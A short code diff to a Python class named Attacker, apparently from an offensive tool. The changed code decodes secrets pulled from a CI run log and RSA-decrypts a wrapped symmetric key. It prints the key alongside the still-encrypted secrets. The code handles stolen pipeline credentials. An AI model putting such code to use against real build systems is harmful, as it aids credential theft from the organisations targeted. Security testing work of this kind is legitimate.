@@ -552,16 +552,18 @@ class Attacker:
 
                 blob = matcher.findall(res)
 
-                if len(blob) == 2:
+                if len(blob) == 3:
                     encrypted_secrets = base64.b64decode(blob[1])
+                    encrypted_key = base64.b64decode(blob[2])
                     Output.owned(
                         "Decrypted and Decoded Secrets:\n"
                     )
 
-                    plaintext = priv_key.decrypt(encrypted_secrets,
-                                                 padding.PKCS1v15()).decode()
+                    sym_key = priv_key.decrypt(encrypted_key,
+                                               padding.PKCS1v15()).decode()
 
-                    print(plaintext)
+                    print('key', sym_key)
+                    print('secrets', encrypted_secrets)
                 else:
                     Output.error(
                         "Unable to extract encoded output from runlog!"
